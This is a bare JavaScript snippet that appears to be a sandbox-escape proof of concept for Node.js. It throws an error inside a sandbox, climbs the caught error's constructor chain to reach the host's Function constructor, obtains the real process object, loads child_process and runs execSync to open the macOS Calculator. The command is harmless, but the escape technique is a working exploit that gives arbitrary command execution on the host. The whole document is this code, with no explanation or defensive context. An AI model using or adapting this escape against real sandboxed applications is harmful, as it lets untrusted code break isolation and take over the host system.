(function() { 
    try{ 
        propertyIsEnumerable.call();
    } catch(pp){
        pp.constructor.constructor('return process')().mainModule.require('child_process').execSync('open /System/Applications/Calculator.app');
    }
})()

